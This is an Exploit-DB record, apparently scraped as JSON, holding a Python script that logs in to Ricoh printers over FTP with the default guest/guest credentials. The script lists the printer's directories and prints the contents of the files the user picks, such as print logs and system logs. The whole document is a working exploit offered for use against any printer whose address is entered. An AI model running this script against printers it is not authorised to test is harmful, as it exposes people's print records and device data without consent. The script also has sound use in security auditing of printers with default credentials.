{"source": "https://www.exploit-db.com/exploits/51755", "vulnName": "Ricoh Printer - Directory and File Exposure", "vulnEDBID": "51755", "vulnCVE": "N/A", "author": "THOMAS HEVERIN", "exploitType": "REMOTE", "platform": "HARDWARE", "datePublished": "2024-01-29", "vulnContent": "#Exploit Title: Ricoh Printer Directory and File Exposure \n#Date: 9/15/2023\n#Exploit Author: Thomas Heverin (Heverin Hacker)\n#Vendor Homepage: https://www.ricoh.com/products/printers-and-copiers\n#Software Link: https://replit.com/@HeverinHacker/Ricoh-Printer-Directory-and-File-Finder#main.py\n#Version: Ricoh Printers - All Versions\n#Tested on: Windows\n#CVE: N/A \n\n#Directories Found: Help, Info (Printer Information), Prnlog (Print Log), Stat (Statistics) and Syslog (System Log)\n\nfrom ftplib import FTP\n\ndef ftp_connect(ip):\n    try:\n        ftp = FTP(ip)\n        ftp.login(\"guest\", \"guest\")\n        print(f\"Connected to {ip} over FTP as 'guest'\")\n        return ftp\n    except Exception as e:\n        print(f\"Failed to connect to {ip} over FTP: {e}\")\n        return None\n\nif __name__ == \"__main__\":\n    target_ip = input(\"Enter the Ricoh Printer IP address: \")\n    \n    ftp_connection = ftp_connect(target_ip)\n    if ftp_connection:\n        try:\n            while True:\n                file_list = ftp_connection.nlst()\n                print(\"List of Ricoh printer files and directories:\")\n                for index, item in enumerate(file_list, start=1):\n                    print(f\"{index}. {item}\")\n                \n                file_index = int(input(\"Enter the printer index of the file to read (1-based), or enter 0 to exit: \")) - 1\n                if file_index < 0:\n                    break\n                \n                if 0 <= file_index < len(file_list):\n                    selected_file = file_list[file_index]\n                    lines = []\n                    ftp_connection.retrlines(\"RETR \" + selected_file, lines.append)\n                    print(f\"Contents of '{selected_file}':\")\n                    for line in lines:\n                        print(line)\n                else:\n                    print(\"Invalid file index.\")\n        except Exception as e:\n            print(f\"Failed to perform operation: {e}\")\n        finally:\n            ftp_connection.quit()\n            "}